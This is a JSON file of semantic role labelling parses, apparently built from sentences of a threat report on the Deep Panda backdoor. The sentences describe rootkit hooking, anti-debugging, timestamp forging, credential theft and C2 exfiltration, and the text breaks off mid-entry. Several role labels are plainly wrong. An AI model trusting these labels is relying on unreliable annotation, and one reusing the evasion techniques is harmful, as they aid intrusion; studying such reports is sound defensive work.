{"\n\nThis sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide\nan interactive command line shell to the C2": {"is": {"ARG1": {"text": "This sample"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a DLL which can be registered as a service and is used to drop a kernel driver and provide an interactive command line shell to the C2"}}, "can": {"V": {"text": "can", "index": 6}}, "be": {"ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 7}}, "registered": {"ARG1": {"text": "a DLL"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "registered", "index": 8}, "ARG3": {"text": "as a service"}}, "is_2": {"ARG1": {"text": "a DLL"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "used to drop a kernel driver and provide an interactive command line shell to the C2"}}, "used": {"ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 14}, "ARG1": {"text": "to drop a kernel driver"}}, "drop": {"V": {"text": "drop", "index": 16}, "ARG1": {"text": "a kernel driver"}}, "provide": {"V": {"text": "provide", "index": 21}, "ARG1": {"text": "an interactive command line shell"}, "ARG2": {"text": "to the C2"}}}, " The incoming connection contents are forwarded to the C2 and\ndata from the C2 is passed on to connections": {"are": {"V": {"text": "are", "index": 4}}, "forwarded": {"ARG1": {"text": "The incoming connection contents"}, "V": {"text": "forwarded", "index": 5}, "ARG2": {"text": "to the C2"}}, "is": {"V": {"text": "is", "index": 14}}, "passed": {"ARG1": {"text": "data from the C2"}, "V": {"text": "passed", "index": 15}, "ARG2": {"text": "to connections"}}}, " The backdoor is then started under that\naccount and the user is deleted": {"is": {"ARG1": {"text": "The backdoor"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "started under that account and the user is deleted"}}, "started": {"ARG1": {"text": "The backdoor"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "started", "index": 4}, "ARGM-LOC": {"text": "under that account"}}, "is_2": {"V": {"text": "is", "index": 11}}, "deleted": {"ARG1": {"text": "the user"}, "V": {"text": "deleted", "index": 12}}}, " This sample has multiple communication capabilities available that makes it far more versatile\nand stealthy": {"has": {"ARG0": {"text": "This sample"}, "V": {"text": "has", "index": 2}, "ARG1": {"text": "multiple communication capabilities available that makes it far more versatile and stealthy"}}, "makes": {"ARG0": {"text": "multiple communication capabilities available"}, "R-ARG0": {"text": "that"}, "V": {"text": "makes", "index": 8}, "ARG1": {"text": "it far more versatile and stealthy"}}}, " It supports up to 1024 parallel connections": {"supports": {"ARG0": {"text": "It"}, "V": {"text": "supports", "index": 1}, "ARG1": {"text": "to 1024 parallel connections"}}}, " If the installation of the new\nservice is successful, the sample then starts the new service and exits": {"is": {"ARG1": {"text": "the installation of the new service"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "successful"}}, "starts": {"ARGM-ADV": {"text": "If the installation of the new service is successful"}, "ARG0": {"text": "the sample"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "starts", "index": 13}, "ARG1": {"text": "the new service"}}}, " After it copies itself, it will modify the creation time, last access time and last modification    time to \n           the current system time when the copy was made but with the year changed to 2005": {"copies": {"ARG0": {"text": "it"}, "V": {"text": "copies", "index": 2}, "ARG1": {"text": "itself"}}, "will": {"V": {"text": "will", "index": 6}}, "modify": {"ARGM-TMP": {"text": "After it copies itself"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "modify", "index": 7}, "ARG1": {"text": "the creation time"}}, "was": {"V": {"text": "was", "index": 27}}, "made": {"ARGM-TMP": {"text": "the current system time"}, "R-ARGM-TMP": {"text": "when"}, "ARG1": {"text": "the copy"}, "V": {"text": "made", "index": 28}}, "changed": {"ARG1": {"text": "the year"}, "V": {"text": "changed", "index": 33}, "ARG2": {"text": "to 2005"}}}, " All three samples provided remote access to the attacker, via two Command and Control (C2) servers": {"provided": {"ARG0": {"text": "All three samples"}, "V": {"text": "provided", "index": 3}, "ARG1": {"text": "remote access"}, "ARG2": {"text": "to the attacker"}, "ARGM-MNR": {"text": "via two Command and Control ( C2 ) servers"}}}, "\n</section>\n\n<section>\n<heading>Hooking</heading>\nThe final step of the entry point is to begin hooking the system, which is done by two helper functions - one \nis designed to hook the system call table, while the other hooks the network stack": {"is": {"ARG1": {"text": "The final step of the entry point"}, "V": {"text": "is", "index": 7}, "ARG2": {"text": "to begin hooking the system , which is done by two helper functions - one is designed to hook the system call table , while the other hooks the network stack"}}, "begin": {"V": {"text": "begin", "index": 9}, "ARG1": {"text": "hooking the system , which is done by two helper functions - one is designed to hook the system call table ,"}, "ARGM-TMP": {"text": "while the other hooks the network stack"}}, "hooking": {"V": {"text": "hooking", "index": 10}, "ARG1": {"text": "the system , which is done by two helper functions - one is designed to hook the system call table , while"}}, "is_2": {"V": {"text": "is", "index": 15}}, "done": {"ARG1": {"text": "the system"}, "R-ARG1": {"text": "which"}, "V": {"text": "done", "index": 16}, "ARG0": {"text": "by two helper functions - one"}}, "is_3": {"V": {"text": "is", "index": 23}}, "designed": {"ARG1": {"text": "the system , which is done by two helper functions - one"}, "V": {"text": "designed", "index": 24}, "ARG3": {"text": "to hook the system call table"}, "ARGM-TMP": {"text": "while the other hooks the network stack"}}, "hook": {"V": {"text": "hook", "index": 26}, "ARG1": {"text": "the system call table"}}}, "\n\nIn the registry hooking code of the driver, a call is made to ObReferenceObjectByHandle()": {"is": {"V": {"text": "is", "index": 11}}, "made": {"ARGM-LOC": {"text": "In the registry hooking code of the driver"}, "V": {"text": "made", "index": 12}, "ARG1": {"text": "to ObReferenceObjectByHandle ( )"}}, "ObReferenceObjectByHandle": {"V": {"text": "ObReferenceObjectByHandle", "index": 14}, "ARG1": {"text": "( )"}}}, " This means that after cleaning up the components dropped by the malware, the\nsystem remains vulnerable to local attacks by simply overwriting the legitimate rundll32.exe executable with\na malicious version and await it\u2019s automatic execution by the Operating System": {"means": {"ARG0": {"text": "This"}, "V": {"text": "means", "index": 1}, "ARG1": {"text": "that after cleaning up the components dropped by the malware , the system remains vulnerable to local attacks by simply overwriting the legitimate rundll32.exe executable with a malicious version and await it \u2019s automatic execution by the Operating System"}}, "cleaning": {"V": {"text": "cleaning", "index": 4}, "ARG1": {"text": "the components dropped by the malware"}, "ARG0": {"text": "the system"}}, "dropped": {"ARG1": {"text": "the components"}, "V": {"text": "dropped", "index": 8}, "ARG0": {"text": "by the malware"}}, "remains": {"ARGM-TMP": {"text": "after cleaning up the components dropped by the malware"}, "ARG1": {"text": "the system"}, "V": {"text": "remains", "index": 15}, "ARG3": {"text": "vulnerable to local attacks"}, "ARGM-MNR": {"text": "by simply overwriting the legitimate rundll32.exe executable with a malicious version"}}, "overwriting": {"ARG0": {"text": "the system"}, "ARGM-ADV": {"text": "simply"}, "ARG1": {"text": "the legitimate rundll32.exe executable"}, "ARGM-MNR": {"text": "with a malicious version"}}, "await": {"ARGM-TMP": {"text": "after cleaning up the components dropped by the malware"}, "ARG1": {"text": "the system"}, "V": {"text": "await", "index": 32}, "ARG2": {"text": "it \u2019s automatic execution by the Operating System"}}}, " If McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules\n           the copy to be deleted on reboot using the well documented MoveFileExA API": {"is": {"ARG1": {"text": "McAfee AV"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "installed"}}, "installed": {"ARG1": {"text": "McAfee AV"}, "V": {"text": "installed", "index": 4}}, "creates": {"ARGM-ADV": {"text": "If McAfee AV is installed"}, "V": {"text": "creates", "index": 6}, "ARG1": {"text": "a copy of regsvr32.exe named Update.exe"}}, "named": {"ARG1": {"text": "regsvr32.exe"}, "V": {"text": "named", "index": 11}, "ARG2": {"text": "Update.exe"}}, "schedules": {"ARGM-ADV": {"text": "If McAfee AV is installed/ using the well documented MoveFileExA API"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "schedules", "index": 15}, "ARG1": {"text": "the copy"}, "ARG2": {"text": "to be deleted on reboot"}}, "be": {"V": {"text": "be", "index": 19}, "ARG2": {"text": "deleted"}}, "deleted": {"ARG1": {"text": "the"}, "V": {"text": "deleted", "index": 20}, "ARGM-LOC": {"text": "on reboot"}, "ARGM-MNR": {"text": "using the well documented MoveFileExA API"}}, "reboot": {"V": {"text": "reboot", "index": 22}}, "using": {"V": {"text": "using", "index": 23}, "ARG1": {"text": "the well documented MoveFileExA API"}}, "documented": {"ARGM-MNR": {"text": "well"}, "V": {"text": "documented", "index": 26}, "ARG1": {"text": "MoveFileExA API"}}}, " The capabilities include recovering authentication credentials from various system and client storage\nsuch as Mozilla Firefox, Internet Explorer, and Remote Access Service (RAS)": {"include": {"ARG2": {"text": "The capabilities"}, "V": {"text": "include", "index": 2}, "ARG1": {"text": "recovering authentication credentials from various system and client storage such as Mozilla Firefox , Internet Explorer , and Remote Access Service ( RAS )"}}, "recovering": {"V": {"text": "recovering", "index": 3}, "ARG1": {"text": "authentication credentials from various system and client storage such as Mozilla Firefox , Internet"}}}, "\n\nThe dropped DLL (MD5: 47619fca20895abc83807321cbb80a3d) itself contains functionality that is typical\nof a Remote Access Tool(RAT) which are commonly used by PRC based actors in data exfiltration attacks": {"contains": {"ARG0": {"text": "47619fca20895abc83807321cbb80a3d ) itself"}, "V": {"text": "contains", "index": 9}, "ARG1": {"text": "functionality that is typical of a Remote Access Tool(RAT ) which are commonly used by PRC based actors in data exfiltration attacks"}}, "is": {"ARG1": {"text": "functionality"}, "R-ARG1": {"text": "that"}, "V": {"text": "is", "index": 12}, "ARG2": {"text": "typical of a Remote Access Tool(RAT ) which are commonly used by PRC based actors in data exfiltration attacks"}}, "are": {"V": {"text": "are", "index": 21}}, "used": {"ARG1": {"text": "a Remote Access Tool(RAT )"}, "R-ARG1": {"text": "which"}, "ARGM-ADV": {"text": "commonly"}, "V": {"text": "used", "index": 23}, "ARG0": {"text": "by PRC based actors in data exfiltration attacks"}}, "based": {"V": {"text": "based", "index": 26}, "ARG1": {"text": "actors"}}}, "\n</section>\n\n<section>\n<heading>C2 Command Invocation</heading>\nThe main backdoor thread then reads commands from the chosen C2 protocol and passes them on to any\nof the following registered handler classes based upon a command ID": {"reads": {"ARG0": {"text": "The main backdoor thread"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "reads", "index": 5}, "ARG1": {"text": "commands"}, "ARG3": {"text": "from the chosen C2 protocol"}}, "chosen": {"V": {"text": "chosen", "index": 9}, "ARG1": {"text": "C2 protocol"}}, "passes": {"ARG0": {"text": "The main backdoor thread"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "passes", "index": 13}, "ARG1": {"text": "them"}, "ARGM-DIR": {"text": "on/ to any of the following registered handler classes based upon a command ID"}}, "following": {"V": {"text": "following", "index": 20}, "ARG1": {"text": "registered handler classes"}}, "based": {"ARG1": {"text": "the following registered handler classes"}, "V": {"text": "based", "index": 24}, "ARG2": {"text": "upon a command ID"}}}, "\n</section>\n\n<section>\n<heading>Network Stack Hooking</heading>\nThe network stack hooking first queries the OS version using RtlGetVersion() or PsGetVersion()": {"queries": {"ARG0": {"text": "The network stack hooking"}, "ARGM-TMP": {"text": "first"}, "V": {"text": "queries", "index": 5}, "ARG1": {"text": "the OS version"}, "ARGM-MNR": {"text": "using RtlGetVersion ( ) or PsGetVersion ( )"}}, "using": {"V": {"text": "using", "index": 9}, "ARG1": {"text": "RtlGetVersion ( ) or PsGetVersion ( )"}}}, " In addition, an 8 byte key is sent \nto the client which is then RC4 encrypted using the random number generated in step 2 from above as the\npassword": {"is": {"V": {"text": "is", "index": 7}}, "sent": {"ARGM-DIS": {"text": "In addition"}, "ARG1": {"text": "an 8 byte key"}, "V": {"text": "sent", "index": 8}, "ARG2": {"text": "to the client which is then RC4 encrypted using the random number generated in step 2 from above as the password"}}, "is_2": {"ARG1": {"text": "the client"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 13}, "ARGM-TMP": {"text": "then"}, "ARG2": {"text": "RC4 encrypted"}, "ARGM-ADV": {"text": "using the random number generated in step 2 from above"}, "ARGM-PRD": {"text": "as the password"}}, "encrypted": {"ARGM-TMP": {"text": "then"}, "ARG1": {"text": "RC4"}, "V": {"text": "encrypted", "index": 16}, "ARGM-MNR": {"text": "using the random number generated in step 2 from above as the password"}}, "using": {"V": {"text": "using", "index": 17}, "ARG1": {"text": "the random number generated in step 2 from above"}, "ARG2": {"text": "as the password"}}, "generated": {"ARG1": {"text": "the random number"}, "V": {"text": "generated", "index": 21}, "ARG4": {"text": "in step 2"}, "ARG3": {"text": "from above"}}}, " It implements relatively well thought out protocols including HTTP and DNS": {"implements": {"ARG0": {"text": "It"}, "V": {"text": "implements", "index": 1}, "ARG1": {"text": "relatively well thought out protocols including HTTP and DNS"}}, "thought": {"ARGM-ADV": {"text": "relatively well"}, "V": {"text": "thought", "index": 4}}, "including": {"ARG2": {"text": "protocols"}, "V": {"text": "including", "index": 7}, "ARG1": {"text": "HTTP and DNS"}}}, "\n\n</section>\n\n<footer>\nCROWDSTRIKE                                                                          S E N S I T I VE          2\n</footer>\n\f\f\n<header>DEEP PANDA</header>\n\n<section>\n\n\n                              <heading>TECHNICAL ANALYSIS</heading>\n\n<heading>Dropper Sample (MD5: 14c04f88dc97aef3e9b516ef208a2bf5)</heading>\nThe executable 14c04f88dc97aef3e9b516ef208a2bf5 is commonly referred to as a \u2018dropper\u2019, which is\ndesigned with the purpose of extracting from itself a malicious payload and to initialize and install it into a\ntargeted system": {"is": {"V": {"text": "is", "index": 3}}, "referred": {"ARG1": {"text": "The executable 14c04f88dc97aef3e9b516ef208a2bf5"}, "ARGM-ADV": {"text": "commonly"}, "V": {"text": "referred", "index": 5}, "ARG2": {"text": "as a \u2018 dropper \u2019 , which is designed with the purpose of extracting from itself a malicious payload and to initialize and install it into a targeted system"}}, "is_2": {"V": {"text": "is", "index": 14}}, "designed": {"ARG1": {"text": "a \u2018 dropper \u2019"}, "R-ARG1": {"text": "which"}, "V": {"text": "designed", "index": 15}, "ARG3": {"text": "with the purpose of extracting from itself a malicious payload and to initialize and install it into a targeted system"}}, "extracting": {"V": {"text": "extracting", "index": 20}, "ARG3": {"text": "from itself"}, "ARG1": {"text": "a malicious payload"}}, "initialize": {"V": {"text": "initialize", "index": 28}}, "install": {"V": {"text": "install", "index": 30}, "ARG1": {"text": "it"}, "ARG2": {"text": "into a targeted system"}}, "targeted": {"V": {"text": "targeted", "index": 34}, "ARG1": {"text": "system"}}}, "\n</section>\n\n<section>\n<heading>Multiple Instance Protection</heading>\nThe driver begins by opening a named event in the BaseNamedObjects object directory with the name\n{8CB2ff21-0166-4cf1-BD8F-E190BC7902DC} using the Windows API ZwOpenEvent()": {"begins": {"ARG1": {"text": "The driver"}, "V": {"text": "begins", "index": 2}, "ARGM-MNR": {"text": "by opening a named event in the BaseNamedObjects object directory with the name { 8CB2ff21 - 0166 - 4cf1-BD8F - E190BC7902DC } using the Windows API ZwOpenEvent ( )"}}, "opening": {"V": {"text": "opening", "index": 4}, "ARG1": {"text": "a named event in the BaseNamedObjects object directory"}, "ARGM-MNR": {"text": "with the name { 8CB2ff21 - 0166 - 4cf1-BD8F - E190BC7902DC } using the Windows API ZwOpenEvent ( )"}}, "named": {"V": {"text": "named", "index": 6}, "ARG1": {"text": "event"}}, "object": {"V": {"text": "object", "index": 11}, "ARG0": {"text": "directory"}}, "using": {"V": {"text": "using", "index": 25}, "ARG1": {"text": "the Windows API ZwOpenEvent ( )"}}}, "\n</section>\n\n<section>\n<heading>Anti-Debugging Protection</heading>\nThe second component of the entry point performs an anti-debugging technique, calling the function\nKdDisableDebugger(), which allows the driver to disable usage of the built-in Windows kernel debugging\nfacility that is used by popular kernel debuggers KD and WinDbg": {"performs": {"ARG0": {"text": "The second component of the entry point"}, "V": {"text": "performs", "index": 7}, "ARG1": {"text": "an anti - debugging technique"}, "ARGM-ADV": {"text": "calling the function KdDisableDebugger ( ) , which allows the driver to disable usage of the built - in Windows kernel debugging facility that is used by popular kernel debuggers KD and WinDbg"}}, "calling": {"V": {"text": "calling", "index": 14}, "ARG1": {"text": "the function KdDisableDebugger"}, "ARG2": {"text": "(/ )"}, "ARGM-ADV": {"text": "which allows the driver to disable usage of the built - in Windows kernel debugging facility that is used by popular kernel debuggers KD and WinDbg"}}, "allows": {"ARG0": {"text": "the function KdDisableDebugger ( )"}, "R-ARG0": {"text": "which"}, "V": {"text": "allows", "index": 22}, "ARG1": {"text": "the driver to disable usage of the built - in Windows kernel debugging facility that is used by popular kernel debuggers KD and WinDbg"}}, "built": {"V": {"text": "built", "index": 30}, "ARG1": {"text": "in Windows kernel debugging facility that is used by popular kernel debuggers KD and WinDbg"}}, "kernel": {"ARG1": {"text": "Windows"}, "V": {"text": "kernel", "index": 34}}, "debugging": {"V": {"text": "debugging", "index": 35}, "ARG0": {"text": "facility"}}, "is": {"V": {"text": "is", "index": 38}}, "used": {"ARG1": {"text": "the built - in Windows kernel debugging facility"}, "R-ARG1": {"text": "that"}, "V": {"text": "used", "index": 39}, "ARG0": {"text": "by popular kernel debuggers KD and WinDbg"}}}, "\n</section>\n\n<section>\n<heading>System Driver</heading>\nThe kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the\nCCRootkit package publicly by Steven Lai (a/k/a embedlinux)": {"dropped": {"ARG1": {"text": "The kernel driver component"}, "V": {"text": "dropped", "index": 4}, "ARG2": {"text": "by the Backdoor"}}, "bears": {"ARG0": {"text": "The kernel driver component dropped by the Backdoor DLL"}, "V": {"text": "bears", "index": 9}, "ARG1": {"text": "many tool marks associating it"}, "ARG2": {"text": "with the CCRootkit package publicly by Steven Lai ( a / k / a embedlinux )"}}, "associating": {"V": {"text": "associating", "index": 13}, "ARG1": {"text": "it"}, "ARG2": {"text": "with the CCRootkit package"}, "ARGM-MNR": {"text": "publicly"}, "ARG0": {"text": "by Steven Lai ( a / k / a embedlinux )"}}}, "\n</section>\n\n<section>\n<heading>TCP Hook</heading>\nThe TCP hook works almost identically to the NSI hook, though instead hooking IOCTL 0x120003 (IOCTL_\nTCP_QUERY_INFORMATION_EX)": {"works": {"ARG0": {"text": "The TCP hook"}, "V": {"text": "works", "index": 3}, "ARGM-MNR": {"text": "almost identically"}, "ARG1": {"text": "to the NSI hook"}, "ARGM-ADV": {"text": "though instead hooking IOCTL 0x120003 ( IOCTL _ TCP_QUERY_INFORMATION_EX )"}}, "hooking": {"ARG0": {"text": "The TCP"}, "ARGM-DIS": {"text": "instead"}, "V": {"text": "hooking", "index": 13}, "ARG1": {"text": "IOCTL 0x120003"}}}, "      infocardapi.dll\n</list>\n\nThe dropper sets the creation and last written timestamp of the newly created file to the date 2007-03-07 \n00:00:00; this allows the newly created malicious  DLL to blend in with other system files": {"sets": {"ARGM-DIS": {"text": "infocardapi.dll"}, "ARG0": {"text": "The dropper"}, "V": {"text": "sets", "index": 3}, "ARG1": {"text": "the creation"}}, "written": {"ARG0": {"text": "infocardapi.dll/ The dropper"}, "ARGM-TMP": {"text": "last"}, "V": {"text": "written", "index": 8}, "ARG1": {"text": "timestamp of the newly created file to the date 2007 - 03 - 07 00:00:00"}}, "created": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "created", "index": 13}, "ARG1": {"text": "file"}}, "allows": {"ARG0": {"text": "this"}, "V": {"text": "allows", "index": 26}, "ARG1": {"text": "the newly created malicious DLL to blend in with other system files"}}, "created_2": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "created", "index": 29}, "ARG1": {"text": "malicious DLL"}}, "blend": {"ARG1": {"text": "the newly created malicious DLL"}, "V": {"text": "blend", "index": 33}, "ARG2": {"text": "with other system files"}}}, " Instead of hooking the entry in the\ntable directly, which is easily detectable, the driver uses the LDASM open-source disassembly engine to\nanalyze the function that is being pointed to by the table, and applying a Detours-style hook directly in the\ncode": {"hooking": {"V": {"text": "hooking", "index": 2}, "ARG1": {"text": "the entry in the table"}, "ARGM-MNR": {"text": "directly"}, "ARGM-ADV": {"text": "which is easily detectable"}, "ARG0": {"text": "the driver"}}, "is": {"ARG1": {"text": "the entry in the table directly"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 11}, "ARG2": {"text": "easily/ detectable"}}, "uses": {"ARGM-ADV": {"text": "Instead of hooking the entry in the table directly , which is easily detectable ,"}, "ARG0": {"text": "the driver"}, "V": {"text": "uses", "index": 17}, "ARG1": {"text": "the LDASM open - source disassembly engine"}, "ARG2": {"text": "to analyze the function that is being pointed to by the table , and applying a Detours - style hook directly in the code"}}, "analyze": {"ARG0": {"text": "the driver"}, "V": {"text": "analyze", "index": 26}, "ARG1": {"text": "the function that is being pointed to by the table"}}, "is_2": {"V": {"text": "is", "index": 30}}, "being": {"V": {"text": "being", "index": 31}}, "pointed": {"V": {"text": "pointed", "index": 32}, "ARG2": {"text": "to"}, "ARG0": {"text": "by the table"}}, "applying": {"V": {"text": "applying", "index": 39}, "ARG1": {"text": "a Detours - style hook"}, "ARGM-MNR": {"text": "directly"}, "ARG2": {"text": "in the code"}}}, "\n</section>\n\n<section>\n<heading>PCC_PROXY: TCP Proxy</heading>\nThis handler class implements a generic TCP proxy": {"implements": {"ARG0": {"text": "This handler class"}, "V": {"text": "implements", "index": 3}, "ARG1": {"text": "a generic TCP proxy"}}}, " This class also supports\ngathering intelligence on the infected system including identifying security tools by their process name, proxy\naccounts, and version numbers for the Operating System (OS) and Internet Explorer": {"supports": {"ARG0": {"text": "This class"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "supports", "index": 3}, "ARG1": {"text": "gathering intelligence on the infected system including identifying security tools by their process name , proxy accounts , and version numbers for the Operating System ( OS ) and Internet Explorer"}}, "gathering": {"V": {"text": "gathering", "index": 4}, "ARG1": {"text": "intelligence on the infected system including identifying security tools by their process name , proxy accounts ,"}}, "including": {"ARG2": {"text": "the infected system"}, "V": {"text": "including", "index": 10}, "ARG1": {"text": "identifying security tools by their process name , proxy accounts"}}, "identifying": {"V": {"text": "identifying", "index": 11}, "ARG1": {"text": "security tools"}, "ARGM-MNR": {"text": "by their process name , proxy accounts"}}}, " The unpacked kernel driver sample hooks these functions by reading the second \nDWORD at each of these exported functions": {"hooks": {"ARG0": {"text": "The unpacked kernel driver sample"}, "V": {"text": "hooks", "index": 5}, "ARG1": {"text": "these functions"}, "ARG2": {"text": "by reading the second DWORD at each of these exported functions"}}, "reading": {"V": {"text": "reading", "index": 9}, "ARG1": {"text": "the second DWORD"}, "ARGM-LOC": {"text": "at each of these exported functions"}}, "exported": {"V": {"text": "exported", "index": 17}, "ARG1": {"text": "functions"}}}, " The use of the Chrome icon may indicate a possible attempt to socially\nengineer the intended victim into thinking the dropper was a legitimate file associated with Google": {"may": {"V": {"text": "may", "index": 6}}, "indicate": {"ARG0": {"text": "The use of the Chrome icon"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "indicate", "index": 7}, "ARG1": {"text": "a possible attempt to socially engineer the intended victim into thinking the dropper was a legitimate file associated with Google"}}, "engineer": {"ARGM-MNR": {"text": "socially"}, "V": {"text": "engineer", "index": 13}, "ARG1": {"text": "the intended victim"}, "ARGM-PRD": {"text": "into thinking"}}, "intended": {"V": {"text": "intended", "index": 15}, "ARG1": {"text": "victim"}}, "thinking": {"V": {"text": "thinking", "index": 18}, "ARG1": {"text": "the dropper was a legitimate file associated with Google"}}, "was": {"ARG1": {"text": "the dropper"}, "V": {"text": "was", "index": 21}, "ARG2": {"text": "a legitimate file associated with Google"}}, "associated": {"ARG1": {"text": "a legitimate file"}, "V": {"text": "associated", "index": 25}, "ARG2": {"text": "with Google"}}}, " Open source research of the 4 innocuous kernel APIs\n \"ZwSaveKey ZwQueryValueKey ZwEnumerateValueKey IoAllocateMdl\", in concert leads directly to a \n Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs": {"Open": {"V": {"text": "Open", "index": 0}, "ARG1": {"text": "source research of the 4 innocuous kernel APIs \" ZwSaveKey ZwQueryValueKey ZwEnumerateValueKey IoAllocateMdl \""}}, "leads": {"ARG0": {"text": "Open source research of the 4 innocuous kernel APIs \" ZwSaveKey ZwQueryValueKey ZwEnumerateValueKey IoAllocateMdl \""}, "ARGM-MNR": {"text": "in concert/ directly"}, "V": {"text": "leads", "index": 18}, "ARG2": {"text": "to a Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs"}}, "has": {"ARG0": {"text": "a Chinese website"}, "R-ARG0": {"text": "that"}, "V": {"text": "has", "index": 25}, "ARG1": {"text": "a cached rootkit performing similar hooks on the same 3 registry related APIs"}}, "performing": {"ARG0": {"text": "a cached rootkit"}, "V": {"text": "performing", "index": 29}, "ARG1": {"text": "similar hooks on the same 3 registry related APIs"}}, "related": {"ARGM-MNR": {"text": "3/ registry"}, "V": {"text": "related", "index": 37}, "ARG1": {"text": "APIs"}}}, " As a\nprecaution, the sample writes settings directly to the Windows Registry to accomplish the same goal if\ninstalling the service with the documented APIs fails": {"writes": {"ARGM-PRD": {"text": "As a precaution"}, "ARG0": {"text": "the sample"}, "V": {"text": "writes", "index": 6}, "ARGM-MNR": {"text": "settings directly"}, "ARG1": {"text": "to the Windows Registry/ to accomplish the same goal"}, "ARGM-ADV": {"text": "if installing the service with the documented APIs fails"}}, "accomplish": {"ARG0": {"text": "the sample"}, "V": {"text": "accomplish", "index": 14}, "ARG1": {"text": "the same goal"}}, "installing": {"ARG0": {"text": "the sample"}, "V": {"text": "installing", "index": 19}, "ARG1": {"text": "the service"}, "ARG2": {"text": "with the documented APIs fails"}}, "documented": {"V": {"text": "documented", "index": 24}, "ARG1": {"text": "APIs"}}, "fails": {"ARG2": {"text": "the documented"}, "ARG1": {"text": "APIs"}, "V": {"text": "fails", "index": 26}}}, " The rundll32.exe is instantiated with a new NULL Security Identifier (SID)\n(S-1-0-0) with permissions set to grant all access to the file": {"is": {"ARG1": {"text": "The rundll32.exe"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "instantiated with a new NULL Security Identifier ( SID ) ( S-1 - 0 - 0 ) with permissions set to grant all access to the file"}}, "instantiated": {"ARG1": {"text": "The rundll32.exe"}, "V": {"text": "instantiated", "index": 3}, "ARG2": {"text": "with a new NULL Security Identifier ( SID ) ( S-1 - 0 - 0 )"}, "ARGM-ADV": {"text": "with permissions set to grant all access to the file"}}, "set": {"ARG1": {"text": "permissions"}, "V": {"text": "set", "index": 22}, "ARG2": {"text": "to grant all access to the file"}}, "grant": {"V": {"text": "grant", "index": 24}, "ARG1": {"text": "all access"}, "ARG2": {"text": "to the file"}}}, " \n\n\nAfter creating this window, the routine starts the main thread that eventually initiates calling out to the\nCommand and Control (C2)": {"creating": {"V": {"text": "creating", "index": 1}, "ARG1": {"text": "this window"}}, "starts": {"ARGM-TMP": {"text": "After creating this window"}, "ARG2": {"text": "the routine"}, "V": {"text": "starts", "index": 7}, "ARG1": {"text": "the main thread that eventually initiates calling out to the Command and Control ( C2 )"}}, "initiates": {"ARG0": {"text": "the main thread"}, "R-ARG0": {"text": "that"}, "ARGM-TMP": {"text": "eventually"}, "V": {"text": "initiates", "index": 13}, "ARG1": {"text": "calling out to the Command"}}, "calling": {"ARG0": {"text": "that"}, "V": {"text": "calling", "index": 14}, "ARG1": {"text": "to the Command"}}}, "\n</section>\n\n<section>\n<heading>PCC_FILE: Browsing and Data Exfiltration</heading>\nThis handler class for command ID 8 implements generic directory and file browsing using FindFirstFileW() \nand FindNextFileW() APIs, as well as reading and writing arbitrary files via C2 commands, thus enabling upload and download of arbitrary files": {"using": {"V": {"text": "using", "index": 13}, "ARG1": {"text": "FindFirstFileW ( )"}}, "writing": {"V": {"text": "writing", "index": 28}, "ARG1": {"text": "arbitrary files"}, "ARGM-MNR": {"text": "via C2 commands"}}, "enabling": {"ARG0": {"text": "This handler class"}, "ARGM-DIS": {"text": "thus"}, "V": {"text": "enabling", "index": 36}}}, " It allows the adversary to view the main desktop graphically and\ncontrol the keyboard and mouse": {"allows": {"ARG0": {"text": "It"}, "V": {"text": "allows", "index": 1}, "ARG1": {"text": "the adversary to view the main desktop graphically and control the keyboard and mouse"}}, "view": {"ARG0": {"text": "the adversary"}, "V": {"text": "view", "index": 5}, "ARG1": {"text": "the main desktop"}, "ARGM-MNR": {"text": "graphically"}}, "control": {"ARG0": {"text": "the adversary"}, "V": {"text": "control", "index": 11}, "ARG1": {"text": "the keyboard and mouse"}}}, "\n\nCommand 0x20000001 exits the backdoor and 0x20000000 is issued to completely remove the backdoor\nfrom the system": {"exits": {"V": {"text": "exits", "index": 2}, "ARG1": {"text": "the backdoor and 0x20000000"}}, "is": {"V": {"text": "is", "index": 7}}, "issued": {"ARG1": {"text": "Command 0x20000001 exits the backdoor and 0x20000000"}, "V": {"text": "issued", "index": 8}, "ARGM-PNC": {"text": "to completely remove the backdoor from the system"}}, "remove": {"ARG0": {"text": "Command 0x20000001 exits the backdoor and 0x20000000"}, "ARGM-EXT": {"text": "completely"}, "V": {"text": "remove", "index": 11}, "ARG1": {"text": "the backdoor"}, "ARG2": {"text": "from the system"}}}, "\n\nOne interesting command line option allows the backdoor to filter the contents of specified files to remove \ncontent using a regular expression (regex)": {"allows": {"ARG0": {"text": "One interesting command line option"}, "V": {"text": "allows", "index": 5}, "ARG1": {"text": "the backdoor to filter the contents of specified files to remove content using a regular expression ( regex )"}}, "filter": {"ARG0": {"text": "the backdoor"}, "V": {"text": "filter", "index": 9}, "ARG1": {"text": "the contents of specified files"}, "ARG2": {"text": "to remove content using a regular expression ( regex )"}}, "specified": {"V": {"text": "specified", "index": 13}, "ARG1": {"text": "files"}}, "remove": {"V": {"text": "remove", "index": 16}, "ARG1": {"text": "content"}, "ARGM-MNR": {"text": "using a regular expression ( regex )"}}, "using": {"ARG0": {"text": "content"}, "V": {"text": "using", "index": 18}, "ARG1": {"text": "a regular expression 